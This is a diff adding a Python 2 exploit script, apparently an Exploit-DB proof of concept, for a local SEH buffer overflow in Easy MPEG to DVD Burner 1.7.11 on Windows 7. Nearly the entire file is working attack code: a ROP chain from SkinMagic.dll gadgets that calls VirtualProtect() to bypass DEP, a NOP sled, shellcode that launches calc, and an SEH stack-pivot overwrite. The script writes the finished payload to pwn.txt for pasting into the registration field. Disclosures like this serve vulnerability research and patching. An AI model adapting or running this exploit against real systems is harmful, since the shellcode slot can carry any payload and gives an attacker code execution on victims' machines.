@@ -1,0 +1,150 @@
+# Exploit Title: Easy MPEG to DVD Burner 1.7.11 - Buffer Overflow (SEH + DEP)
+# Date: 2020-04-15
+# Exploit Author: Bailey Belisario
+# Tested On: Windows 7 Ultimate x64
+# Software Link: https://www.exploit-db.com/apps/32dc10d6e60ceb4d6e57052b6de3a0ba-easy_mpeg_to_dvd.exe
+# Version: 1.7.11
+# Exploit Length: 1015 Bytes
+# Steps : Open application > Register > In Username field paste content of pwn.txt file (Note open this in sublime or vscode)
+
+# Easy MPEG to DVD Burner 1.7.11 SEH + DEP Bypass using VirtualProtect() on Local Buffer Overflow 
+# Exploit used with Python2.7
+#------------------------------------------------------------------------------------------------------------------------------------#
+# Bad Characters: \x00\x0a\x0d                                                                                                        #
+# SEH Offset: 1012                                                                                                                   #
+# Modules Used: SkinMagic.dll & Easy MPEG to DVD Burner.exe                                                             #
+#------------------------------------------------------------------------------------------------------------------------------------#
+
+# Register setup for VirtualProtect() (Bypass DEP) :
+#---------------------------------------------------
+# EAX = Points to PUSHAD at time VirtualProtect() is called
+# ECX = lpflOldProtect (0x10047d30 as writable location)
+# EDX = flNewProtect(0x40)
+# EBX = dwSize (0x92)
+# ESP = lpAddress (automatic)
+# EBP = ReturnTo (ptr to jmp esp)
+# ESI = ptr to VirtualProtect()
+# EDI = ROP NOP (RETN)
+
+import struct
+
+def create_rop_chain():
+
+    rop_gadgets = [
+      
+      # Put 1 in EDX and decrement to 0
+      0x10031752,  # XOR EDX,EDX # CMP EAX,DWORD PTR [ECX+8] # SETGE DL # MOV AL,DL # RETN
+      0x1003629a,  # ADD EAX,4 # DEC EDX # JNE SKINMAGIC!SETSKINMENU+0X2F505 (10036295) # POP ESI # RETN
+      0x11111111,  # Filler
+
+      # Pop the pointer of VirtualProtect into EAX 
+      0x10037b12,  # POP EAX # RETN
+      0x1003b268,  # ptr to &VirtualProtect() [IAT SkinMagic.dll]
+
+      # Dereference Pointer into EDX then move back to EAX
+      0x1001c011,  # ADD EDX,DWORD PTR [EAX] # RETN 0x0C
+      0x10031772,  # MOV EAX,EDX # RETN
+      0x11111111,  # Filler
+      0x11111111,  # Filler
+      0x11111111,  # Filler
+
+      # Push VP and pop into EBP
+      0x1002e17b,  # PUSH EAX # PUSH ESP # XOR EAX,EAX # POP ESI # POP EBP # RETN 0x0C
+      0x10037b12,  # POP EAX # RETN
+      0x11111111,  # Filler
+      0x11111111,  # Filler
+      0x11111111,  # Filler
+
+      # Use this to get to address needed to Pop VP into ESI
+	    0x1003619e,  # POP EAX # POP ESI # RETN
+
+	    # Move VP to +12 on stack then push the POP POP RETN
+      0x10032485,  # MOV DWORD PTR [ESP+0CH],EBP # LEA EBP,DWORD PTR DS:[ESP+0CH] # PUSH EAX # RETN
+      0x11111111,  # Filler popped
+      0x11111111,  # Filler popped
+
+      # Set ESI to VP
+      0x1002e1ce,  # POP ESI # RETN [SkinMagic.dll] 
+      0x11111111,  # Where VP is MOV into 
+
+	    # Set EBP with POP EBP RETN
+      0x1002894f,  # POP EBP # RETN [SkinMagic.dll] 
+      0x1002894f,  # skip 4 bytes [SkinMagic.dll]
+
+      # Set EDX (# s -d 0x10000000 L?0x10050000 0000003f <- used to find 3F)
+      # Clear out EDX, set it to 0x01, find address where DWORD of EAX will be 0x3F, then add to EDX to be 0x40
+      0x10031752,  # XOR EDX,EDX # CMP EAX,DWORD PTR [ECX+8] # SETGE DL # MOV AL,DL # RETN
+ 	    0x10037b12,  # POP EAX # RETN
+ 	    0x1005a0a0,  # Address of 3F
+ 	    0x10026173,  # ADD EDX,DWORD PTR [EAX] # RETN
+
+ 	    # Set EBX to 0x92 assuming EBX is 0, but could work with a decent range of numbers
+ 	    # Note: This should be at least length of shellcode
+ 	    0x100362c6,  # XOR EAX,EAX # RETN
+	    0x10033fb2,  # ADD AL,0C9 # RETN
+	    0x10033fb2,  # ADD AL,0C9 # RETN
+	    0x10035c12,  # ADC BL,AL # OR CL,CL # JNE SKINMAGIC!SETSKINMENU+0X2EEDB (10035C6B) # RETN
+     
+      # Set ECX to writable location
+      0x1003603f,  # POP ECX # RETN [SkinMagic.dll] 
+      0x10047d30,  # &Writable location [SkinMagic.dll]
+      
+      # Set EDI to ROP NOP
+      0x100395c2,  # POP EDI # RETN [SkinMagic.dll] 
+      0x10032982,  # RETN (ROP NOP) [SkinMagic.dll]
+      
+      # Do PUSHAD and be 1337
+      0x10037654,  # POP EAX # RETN 
+      0xa140acd2,  # CONSTANT
+      0x100317c8,  # ADD EAX,5EFFC883 # RETN 
+      0x1003248d,  # PUSH EAX # RETN
+
+      # Used to jump to ESP
+      0x1001cc57,  # ptr to 'push esp # ret ' [SkinMagic.dll]
+    ]
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+ropChain = create_rop_chain()
+
+# CALC.EXE for POC
+shell = ("\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64\x8B\x72"
+         "\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F"
+         "\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C\x1F\x24"
+         "\x01\xF9\x0F\xB7\x2C\x51\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45"
+         "\x75\xF1\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\xAE\xFF\xD7")
+
+# 148 Bytes needed to return to ROP CHAIN
+paddingBeginning = "B"*148
+
+# NOP Sled needs to be sufficient length, from some math, I came out with a buffer of 444 - len(ROP CHAIN)  
+nopLen = 444 - len(ropChain)
+nopSled = '\x90'*nopLen
+
+# Padding to SEH needs to consider the 420 bytes remaining - shellcode
+paddingMiddleLen = 420 - len(shell)
+paddingMiddle = 'B'*paddingMiddleLen
+
+# 0x004043ee (add esp, 7D4) Stack Pivot 2004 bytes
+# This brings total bytes to SEH Offset (1012) + 3 for a total of 1015 bytes
+seh = "\xee\x43\x40"
+
+# Exploit Visualization  #
+#------------------------#
+#  BBBBBBBBBBBBBBBBBBBB  #
+#------------------------#
+#       ROP CHAIN        #
+#------------------------#
+#          NOPS          #
+#------------------------#
+#       SHELL CODE       #
+#------------------------#
+#  BBBBBBBBBBBBBBBBBBBB  #
+#------------------------#
+#          SEH           #
+#------------------------#
+
+exploit = paddingBeginning + ropChain + nopSled + shell + paddingMiddle + seh
+
+file = open("pwn.txt", 'w')
+file.write(exploit)
+file.close()
